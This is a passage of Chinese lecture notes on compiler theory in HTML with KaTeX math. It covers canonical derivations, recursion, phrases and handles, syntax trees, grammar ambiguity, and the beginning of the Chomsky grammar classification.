规范推导和规范规约</h3>\n<p>很明显，同一个句子、句型是可以通过不同的推导序列推导出的，因为可以选择不同的nonterminal次序。</p>\n<p>最左（最右）推导：推导序列中每一步直接推导都是对左部中最左（最右）的nonterminal进行替换。</p>\n<p>最右推导也叫<strong>规范推导</strong>，用规范推导推导出的句型称为<strong>规范句型</strong>。</p>\n<p>规范推导的逆过程，被称为<strong>最左规约</strong>，也叫做<strong>规范规约</strong>。</p>\n<h3 id=\"规则递归\"><a class=\"markdownIt-Anchor\" href=\"#规则递归\"></a> 规则递归</h3>\n<p>在规则的左部和右部具有相同的nonterminal时，称为递归规则。</p>\n<ul>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow A...</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span>，称为规则左递归。</li>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow ...A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">A</span></span></span></span>，称为规则右递归。</li>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>A</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow ...A...</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span>，称为规则递归。</li>\n</ul>\n<h3 id=\"文法递归\"><a class=\"markdownIt-Anchor\" href=\"#文法递归\"></a> 文法递归</h3>\n<p>对于文法，若存在一个nonterminal和一个推导，和规则递归相似时，称为文法递归。</p>\n<ul>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>⇒</mo><mi>A</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A\\Rightarrow A...</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span>，称为文法左递归。</li>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>⇒</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A\\Rightarrow ...A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">A</span></span></span></span>，称为文法右递归。</li>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>⇒</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>A</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A\\Rightarrow ...A...</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span>，称为文法递归。</li>\n</ul>\n<h3 id=\"短语-直接短语\"><a class=\"markdownIt-Anchor\" href=\"#短语-直接短语\"></a> 短语、直接短语</h3>\n<p>令<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是一个文法，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>是文法的开始符号，而<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>σ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">σ</span></span></span></span>是其一个句型。如果有：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>α</mi><mi>β</mi><mi>σ</mi><mi mathvariant=\"normal\">且</mi><mi>A</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">S \\stackrel{*}{\\Rightarrow}\\alpha \\beta \\sigma且A\\stackrel{+}{\\Rightarrow} \\beta\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.269641em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span></span></p>\n<p>则称：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>是**相对于nonterminal <span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span><strong>的</strong>句型<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>σ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">σ</span></span></span></span>**的短语。</p>\n<p>特别地，如果<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>α</mi><mi>β</mi><mi>σ</mi><mi mathvariant=\"normal\">且</mi><mi>A</mi><mo>⇒</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">S \\stackrel{*}{\\Rightarrow}\\alpha \\beta \\sigma且A\\Rightarrow \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，则称为<strong>直接短语</strong>。</p>\n<h3 id=\"句柄\"><a class=\"markdownIt-Anchor\" href=\"#句柄\"></a> 句柄</h3>\n<p>一个句型的<strong>最左直接短语</strong>称为该句型的<strong>句柄</strong>。</p>\n<ol>\n<li>句柄是直接短语，由于推导左部是nonterminal，所以句柄不仅在直接推导右部，也在一则规则右部。</li>\n<li>最左。</li>\n</ol>\n<h3 id=\"语法树\"><a class=\"markdownIt-Anchor\" href=\"#语法树\"></a> 语法树</h3>\n<h4 id=\"语法树的生成\"><a class=\"markdownIt-Anchor\" href=\"#语法树的生成\"></a> 语法树的生成</h4>\n<p>语法树是句型的推导过程的一种<strong>图形表示</strong>。设存在文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator=\"true\">,</mo><mi>P</mi><mo separator=\"true\">,</mo><mi>S</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G=\\left(V_{N},V_{T},P,S\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>，对其任何句型都能构造满足下列要求的语法树。</p>\n<ol>\n<li>每个结点都有一个标记，标记是$ V_{N}\\cup V_{T}\\cup\\left{\\epsilon\\right} $中的一个符号。</li>\n<li>root结点的标记是开始符号<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>。</li>\n<li>若某一个结点至少有一个子结点，则其标记一定是<strong>nonterminal</strong>。</li>\n<li>若某个结点<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03148em;\">k</span></span></span></span>个子结点，其标记分别为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>A</mi><mi>k</mi></msub></mrow><annotation encoding=\"application/x-tex\">A_{1},...,A_{k}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，则一定存在规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>A</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><mi>i</mi><mo>=</mo><mn>1...</mn><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow A_{i}, i=1...k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\" style=\"margin-right:0.03148em;\">k</span></span></span></span>。</li>\n</ol>\n<h4 id=\"子树和简单子树\"><a class=\"markdownIt-Anchor\" href=\"#子树和简单子树\"></a> 子树和简单子树</h4>\n<p>由于即使是同一课语法树，也有可能对应于多种不同的推导过程。而引入子树和简单子树，则是为了找到<strong>句型短语和句柄</strong>。</p>\n<h5 id=\"子树\"><a class=\"markdownIt-Anchor\" href=\"#子树\"></a> 子树</h5>\n<p>任一非root结点和其所有结点的分支就是子树。</p>\n<h5 id=\"简单子树\"><a class=\"markdownIt-Anchor\" href=\"#简单子树\"></a> 简单子树</h5>\n<p>只具有<strong>单层分支</strong>的子树称为简单子树。</p>\n<ol>\n<li>对于该语法树对应的<strong>句型</strong>，子树的末端结点形成的符号串是<strong>相对于子树root的短语</strong>。</li>\n<li>简单子树的末端结点形成的符号串是相对于简单子树root的<strong>直接短语</strong>。</li>\n<li>最左简单子树的末端结点形成的符号串是<strong>句柄</strong>。</li>\n</ol>\n<h3 id=\"文法的二义性\"><a class=\"markdownIt-Anchor\" href=\"#文法的二义性\"></a> 文法的二义性</h3>\n<p>当存在不同的最左（最右）推导时，产生的语法树也不同。</p>\n<p>文法的句型是否只对迎着唯一的一颗语法树？<br />\n是否只有唯一的最左（最右）推导？</p>\n<p>若某个句子对应两颗不同的语法树，则说该文法是<strong>二义性</strong>的。</p>\n<h4 id=\"二义性的消除\"><a class=\"markdownIt-Anchor\" href=\"#二义性的消除\"></a> 二义性的消除</h4>\n<ol>\n<li>不改变语法规则，加一些语法的非形式规定。比如运算符的优先级。</li>\n<li>构造一个等价的无二义性的文法。</li>\n</ol>\n<p><strong>不存在一个算法，能在有限的步骤内判定一个文法是否为二义性的。</strong></p>\n<h3 id=\"文法和语言的分类\"><a class=\"markdownIt-Anchor\" href=\"#文法和语言的分类\"></a> 文法和语言的分类</h3>\n<p>假设存在文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator=\"true\">,</mo><mi>P</mi><mo separator=\"true\">,</mo><mi>S</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G=\\left(V_{N},V_{T},P,S\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</p>\n<h4 id=\"0型文法无限制文法\"><a class=\"markdownIt-Anchor\" href=\"#0型文法无限制文法\"></a> 0型文法（无限制文法）</h4>\n<p>若文法中每条规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\rightarrow \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>都满足下列要求：</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\alpha \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span 